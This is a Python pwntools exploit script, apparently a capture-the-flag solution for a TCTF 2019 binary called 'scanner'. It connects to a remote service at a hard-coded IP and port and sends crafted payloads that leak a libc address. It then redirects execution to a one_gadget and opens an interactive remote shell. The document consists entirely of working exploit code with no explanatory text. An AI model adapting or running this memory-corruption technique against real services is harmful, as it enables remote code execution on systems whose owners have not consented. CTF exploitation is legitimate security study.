#!/usr/bin/python
#nc 111.186.63.202 7777
from pwn import *
from_file=0
t1=0x40269B
t1=0x4045d0
t2=0x4142deed

#env_={'LD_PRELOAD':'/home/ww9210/tctf2019/scanner/libc.so.6'}
#r=process('scanner.stripped',env=env_)
r=remote('111.186.63.202',7777)

if from_file:
    p=file(fn).read()
    print r.pid
    r.sendline(p)  
else:
    r.sendline(str(0x606FE8)) #libc_start_main
    sleep(0.1)
    r.sendline('***'+cyclic(16)+p64(t2)+p64(t1)+'c'*(0x70-32))
    sleep(0.1)
    p=0xdeadbeef
    r.sendline('***'+p64(p)+cyclic(8))
    sleep(0.1)
    r.sendline('-=')
    sleep(0.1)
    r.recvuntil('1633771874 - 1633771874\n    ')
    buf = r.recvn(6)
    print hex(u64(buf+'\x00'*2))
    libc=u64(buf+'\x00'*2)-0x21ab0
    print hex(libc)
    one_gadget = libc+0x4f322
    raw_input()
    r.sendline(str(0x6070c8))
    sleep(0.1)
    r.sendline('***'+cyclic(16)+p64(t2)+p64(one_gadget)+'c'*(0x70-32))
    sleep(0.1)
    r.sendline('***'+p64(p)+cyclic(8))
    sleep(0.1)
    r.sendline('-=')
    sleep(0.1)

r.interactive()
